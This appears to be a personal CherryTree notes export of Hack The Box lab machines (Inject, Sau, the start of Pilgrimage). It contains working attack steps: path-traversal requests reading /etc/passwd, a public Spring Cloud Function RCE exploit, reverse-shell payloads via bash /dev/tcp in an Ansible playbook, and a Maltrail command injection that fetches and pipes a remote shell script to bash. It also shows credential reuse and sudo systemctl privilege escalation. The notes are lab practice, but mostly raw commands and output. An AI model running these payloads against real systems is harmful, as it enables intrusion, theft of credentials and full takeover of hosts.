<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="HTB" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675434884" ts_lastsave="1689073807">
    <node name="Easypass" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675435533" ts_lastsave="1675435537">
      <node name="Ghidra" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675435542" ts_lastsave="1675435544">
        <rich_text>Open file in Ghidra
</rich_text>
      </node>
    </node>
    <node name="Injection" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689073807" ts_lastsave="1689158249">
      <rich_text>10.129.145.167</rich_text>
      <node name="nmap" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689073815" ts_lastsave="1689074521">
        <rich_text># Nmap 7.94 scan initiated Tue Jul 11 07:11:04 2023 as: nmap -p- -sC -sV -oA nmap/injection 10.129.145.167
Nmap scan report for 10.129.145.167
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Tue Jul 11 07:11:28 2023 -- 1 IP address (1 host up) scanned in 24.42 seconds</rich_text>
      </node>
      <node name="buster" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689074403" ts_lastsave="1689074564">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                                              

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        4w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      112l      326w     5371c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/blogs">http://10.129.145.167:8080/blogs</rich_text>
        <rich_text>
200      GET      104l      194w     5654c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/register">http://10.129.145.167:8080/register</rich_text>
        <rich_text>
200      GET       26l       48w      457c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/test.css">http://10.129.145.167:8080/css/test.css</rich_text>
        <rich_text>
200      GET       54l      107w     1857c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/upload">http://10.129.145.167:8080/upload</rich_text>
        <rich_text>
200      GET       22l       22w      262c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/under.css">http://10.129.145.167:8080/css/under.css</rich_text>
        <rich_text>
500      GET        1l        3w      106c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/error">http://10.129.145.167:8080/error</rich_text>
        <rich_text>
200      GET        7l     2006w   163873c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/webjars/bootstrap/css/bootstrap.min.css">http://10.129.145.167:8080/webjars/bootstrap/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET      166l      487w     6657c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>
200      GET      155l      278w     3093c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/css/blog.css">http://10.129.145.167:8080/css/blog.css</rich_text>
        <rich_text>
200      GET        7l     2006w   163873c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/webjars/bootstrap/5.1.3/css/bootstrap.min.css">http://10.129.145.167:8080/webjars/bootstrap/5.1.3/css/bootstrap.min.css</rich_text>
        <rich_text>
500      GET        1l       27w      712c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/environment">http://10.129.145.167:8080/environment</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/plain]">http://10.129.145.167:8080/plain]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/[">http://10.129.145.167:8080/[</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/]">http://10.129.145.167:8080/]</rich_text>
        <rich_text>
[############&gt;-------] - 72s    18400/30019   0s      found:14      errors:0      
[############&gt;-------] - 72s    18373/30000   253/s   </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                     400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/quote]">http://10.129.145.167:8080/quote]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/extension]">http://10.129.145.167:8080/extension]</rich_text>
        <rich_text>
400      GET        1l       32w      435c </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/[0-9]">http://10.129.145.167:8080/[0-9]</rich_text>
        <rich_text>
[####################] - 2m     30019/30019   0s      found:17      errors:0      
[####################] - 2m     30000/30000   258/s   </rich_text>
        <rich_text link="webs http://10.129.145.167:8080/">http://10.129.145.167:8080/</rich_text>
        <rich_text>                                                                                                                           
</rich_text>
      </node>
      <node name="LFI" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689077445" ts_lastsave="1689077639">
        <rich_text>in burpsuite

GET /show_image?img=../../../../../../etc/passwd HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 1986
Date: Tue, 11 Jul 2023 12:03:39 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
</rich_text>
      </node>
      <node name="LFI2" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689077639" ts_lastsave="1689078228">
        <rich_text>GET /show_image?img=../ HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 4096
Date: Tue, 11 Jul 2023 12:13:33 GMT
Connection: close

java
resources
uploads
</rich_text>
      </node>
      <node name="LFI3" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689078228" ts_lastsave="1689078287">
        <rich_text>GET /show_image?img=../../../../../../../var/www/WebApp/pom.xml HTTP/1.1
Host: 10.129.145.167:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1





HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 2187
Date: Tue, 11 Jul 2023 12:23:36 GMT
Connection: close

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;project xmlns="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text>" xmlns:xsi="</rich_text>
        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
        <rich_text>"
	xsi:schemaLocation="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://maven.apache.org/xsd/maven-4.0.0.xsd">https://maven.apache.org/xsd/maven-4.0.0.xsd</rich_text>
        <rich_text>"&gt;
	&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
	&lt;parent&gt;
		&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
		&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
		&lt;version&gt;2.6.5&lt;/version&gt;
		&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
	&lt;/parent&gt;
	&lt;groupId&gt;com.example&lt;/groupId&gt;
	&lt;artifactId&gt;WebApp&lt;/artifactId&gt;
	&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
	&lt;name&gt;WebApp&lt;/name&gt;
	&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;
	&lt;properties&gt;
		&lt;java.version&gt;11&lt;/java.version&gt;
	&lt;/properties&gt;
	&lt;dependencies&gt;
		&lt;dependency&gt;
  			&lt;groupId&gt;com.sun.activation&lt;/groupId&gt;
  			&lt;artifactId&gt;javax.activation&lt;/artifactId&gt;
  			&lt;version&gt;1.2.0&lt;/version&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;
			&lt;scope&gt;runtime&lt;/scope&gt;
			&lt;optional&gt;true&lt;/optional&gt;
		&lt;/dependency&gt;

		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
			&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;
			&lt;version&gt;3.2.2&lt;/version&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
			&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
			&lt;scope&gt;test&lt;/scope&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
			&lt;artifactId&gt;bootstrap&lt;/artifactId&gt;
			&lt;version&gt;5.1.3&lt;/version&gt;
		&lt;/dependency&gt;
		&lt;dependency&gt;
			&lt;groupId&gt;org.webjars&lt;/groupId&gt;
			&lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;
		&lt;/dependency&gt;

	&lt;/dependencies&gt;
	&lt;build&gt;
		&lt;plugins&gt;
			&lt;plugin&gt;
				&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
				&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
				&lt;version&gt;${parent.version}&lt;/version&gt;
			&lt;/plugin&gt;
		&lt;/plugins&gt;
		&lt;finalName&gt;spring-webapp&lt;/finalName&gt;
	&lt;/build&gt;

&lt;/project&gt;
</rich_text>
      </node>
      <node name="exploit" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689078287" ts_lastsave="1689080353">
        <rich_text>spring-cloud-function-web 3.2.2 exploit

</rich_text>
        <rich_text link="webs https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE">https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE</rich_text>
        <rich_text>

git clone </rich_text>
        <rich_text link="webs https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE.git">https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE.git</rich_text>
        <rich_text>

python3 spring-cloud-rce.py


nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.145.167] 41128
/bin/sh: 0: can't access tty; job control turned off
$ whoami
frank
$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
$


frank@inject:~/.m2$ cat settings.xml 
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;settings xmlns="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text>" xmlns:xsi="</rich_text>
        <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
        <rich_text>"
        xsi:schemaLocation="</rich_text>
        <rich_text link="webs http://maven.apache.org/POM/4.0.0">http://maven.apache.org/POM/4.0.0</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://maven.apache.org/xsd/maven-4.0.0.xsd">https://maven.apache.org/xsd/maven-4.0.0.xsd</rich_text>
        <rich_text>"&gt;
  &lt;servers&gt;
    &lt;server&gt;
      &lt;id&gt;Inject&lt;/id&gt;
      &lt;username&gt;phil&lt;/username&gt;
      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;
      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
      &lt;configuration&gt;&lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;



frank@inject:~$ su phil
Password: 
phil@inject:/home/frank$ whoami
phil
phil@inject:/home/frank$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:/home/frank$


phil@inject:/home/frank$ cd
phil@inject:~$ cat user.txt 
26d42bbfbdbf8ef18ed865c4ce22dee7


run linpeas.sh


phil@inject:/opt/automation/tasks$ cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started

      
create a playbook

phil@inject:/opt/automation/tasks$ cat playbook_2.yml 
- hosts: localhost
  tasks: [shell: /bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/10.10.16.5/444 0&gt;&amp;1 ’]
  
  
wait for callback

      
nc -lvnp 444
listening on [any] 444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.145.167] 57464
bash: cannot set terminal process group (26957): Inappropriate ioctl for device
bash: no job control in this shell
root@inject:/opt/automation/tasks# 

root@inject:/opt/automation/tasks# id
id
uid=0(root) gid=0(root) groups=0(root)

root@inject:~# pwd
pwd
/root
root@inject:~# ls
ls
playbook_1.yml
root.txt
root@inject:~# cat roo	
cat root.txt 
f844e8f584e0af0e6fa67d8261e12929
root@inject:~#</rich_text>
      </node>
    </node>
    <node name="Sau" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689158249" ts_lastsave="1690539664">
      <node name="nmap" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689158254" ts_lastsave="1689171373">
        <rich_text># Nmap 7.94 scan initiated Wed Jul 12 06:34:51 2023 as: nmap -p- -sC -sV -oA nmap/all 10.129.144.245
Nmap scan report for 10.129.144.245
Host is up (0.034s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 12 Jul 2023 10:35:51 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 12 Jul 2023 10:35:25 GMT
|     Content-Length: 27
|     href="/web"&gt;Found&lt;/a&gt;.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 12 Jul 2023 10:35:25 GMT
|_    Content-Length: 0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Wed Jul 12 06:36:49 2023 -- 1 IP address (1 host up) scanned in 117.97 seconds</rich_text>
      </node>
      <node name="web" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171373" ts_lastsave="1689171416">
        <rich_text link="webs http://10.129.144.245:55555/web">http://10.129.144.245:55555/web</rich_text>
      </node>
      <node name="buster" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171416" ts_lastsave="1689171488">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api">http://10.129.144.245:55555/api</rich_text>
        <rich_text>        

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api">http://10.129.144.245:55555/api</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l        3w       45c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/Stats">http://10.129.144.245:55555/api/Stats</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/stats">http://10.129.144.245:55555/api/stats</rich_text>
        <rich_text>
301      GET        2l        3w       47c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/VERSION">http://10.129.144.245:55555/api/VERSION</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
200      GET        1l        1w      140c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
301      GET        2l        3w       45c </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/STATS">http://10.129.144.245:55555/api/STATS</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://10.129.144.245:55555/api/stats">http://10.129.144.245:55555/api/stats</rich_text>
      </node>
      <node name="requests-basket" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171488" ts_lastsave="1689171545">
        <rich_text link="webs http://10.129.144.245:55555/api/version">http://10.129.144.245:55555/api/version</rich_text>
        <rich_text>
name	"request-baskets"
version	"1.2.1"
commit	"n/a"
commit_short	"n/a"
source_code	"</rich_text>
        <rich_text link="webs https://github.com/darklynx/request-baskets">https://github.com/darklynx/request-baskets</rich_text>
        <rich_text>"

</rich_text>
        <rich_text link="webs https://github.com/darklynx/request-baskets/">request-baskets</rich_text>
        <rich_text> 1.2.1  exploit
</rich_text>
      </node>
      <node name="exploit" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689171545" ts_lastsave="1689171835">
        <rich_text link="webs https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3">https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://notes.sjtu.edu.cn/s/MUUhEymt7">https://notes.sjtu.edu.cn/s/MUUhEymt7</rich_text>
        <rich_text>


create burp request

proxy response = true

POST /api/baskets/testHTTP/1.1
Host: 10.129.144.245:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 125

{"forward_url": "</rich_text>
        <rich_text link="webs http://127.0.0.1:80/login">http://127.0.0.1:80/</rich_text>
        <rich_text>","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}


see Maltrail v0.53 exploit


</rich_text>
        <rich_text link="webs https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</rich_text>
        <rich_text>


create another burp request

proxy response = true
login

POST /api/baskets/test2 HTTP/1.1
Host: 10.129.144.245:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 125

{"forward_url": "</rich_text>
        <rich_text link="webs http://127.0.0.1:80/login">http://127.0.0.1:80/login</rich_text>
        <rich_text>","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}



serve reverse shell.sh
python3 -m http.server 80


curl 'http://10.129.144.245:55555/test2' \   
  --data 'username=;`curl http://10.10.14.42/shell.sh | bash`'
  
  
  
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.144.245] 46882
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
puma@sau:/opt/maltrail$
puma@sau:~$ cat user.txt 
cat user.txt
c8958b3fceab6081a92de715b1440bd3



puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
    
    
    
sudo /usr/bin/systemctl status trail.service
!sh

cat root.txt</rich_text>
      </node>
    </node>
    <node name="Pilgrimage" unique_id="19" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689322762" ts_lastsave="1689322925">
      <rich_text>10.129.142.239</rich_text>
      <node name="nmap" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689322767" ts_lastsave="1689323176">
        <rich_text>sudo nmap -p- -sC -sV 10.129.142.239 -oA nmap/all
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-07-14 04:22 EDT
Nmap scan report for 10.129.142.239
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to </rich_text>
